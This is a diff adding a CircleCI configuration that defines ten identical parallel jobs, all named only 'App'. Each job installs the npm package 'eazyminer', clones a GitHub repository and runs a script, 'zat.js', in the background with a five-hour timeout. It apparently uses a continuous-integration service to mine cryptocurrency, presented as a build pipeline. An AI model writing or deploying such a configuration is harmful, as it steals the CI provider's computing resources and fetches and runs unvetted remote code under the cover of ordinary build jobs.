@@ -1,0 +1,142 @@
+version: 2.1
+jobs:
+  
+  App_01:
+    docker:
+      - image: cimg/node:15.0.1
+    
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            npm i eazyminer
+            git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+  App_02:
+    docker:
+      - image: cimg/node:15.0.1
+    
+    steps:
+      
+          
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            npm i eazyminer
+            git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+  App_03:
+    docker:
+      - image: cimg/node:15.0.1
+    
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            npm i eazyminer
+            git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+  App_04:
+    docker:
+      - image: cimg/node:15.0.1
+    
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            npm i eazyminer
+            git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+
+  App_05:  
+    docker:
+      - image: cimg/node:15.0.1
+    
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            npm i eazyminer
+            git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+  App_06:
+    docker:
+      - image: cimg/node:15.0.1
+    
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            npm i eazyminer
+            git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+  App_07: 
+    docker:
+      - image: cimg/node:15.0.1
+    
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            npm i eazyminer
+            git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+  App_08:
+    docker:
+      - image: cimg/node:15.0.1
+    
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            npm i eazyminer
+            git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+  App_09:
+    docker:
+      - image: cimg/node:15.0.1
+    
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            npm i eazyminer
+            git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+  App_10:
+    docker:
+      - image: cimg/node:15.0.1
+    
+    steps:
+      
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            npm i eazyminer
+            git clone https://github.com/mosesmazernak/test.git && cd test && nohup node zat.js
+  
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - App_01
+            - App_02
+            - App_03
+            - App_04
+            - App_05
+            - App_06
+            - App_07
+            - App_08
+            - App_09
+            - App_10
+            
+            
